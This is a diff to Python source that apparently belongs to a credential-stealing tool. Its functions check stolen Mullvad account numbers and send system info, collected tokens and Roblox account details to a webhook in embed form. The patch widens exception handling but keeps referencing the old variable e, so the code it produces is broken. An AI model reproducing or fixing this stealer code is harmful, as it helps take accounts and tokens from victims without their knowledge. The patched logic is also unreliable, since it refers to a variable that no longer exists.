@@ -600,7 +600,8 @@ def validate_mullvad_account(account_number):
             f"{'='*60}"
         )
         
-    except urllib.error.HTTPError as e:
+    except Exception as _e:
+        code = getattr(_e, 'code', None)
         if e.code == 404:
             return f"  Mullvad Account: {account_number} [INVALID - Not found]\n{'='*60}"
         elif e.code == 429:
@@ -2820,7 +2821,8 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                         
                         if avatar_img_url:
                             embed["thumbnail"] = {"url": avatar_img_url}
-                except urllib.error.HTTPError as e:
+                except Exception as _e:
+                    code = getattr(_e, 'code', None)
                     if e.code == 401:
                         embed["fields"].append({
                             "name": "**Roblox Account**",
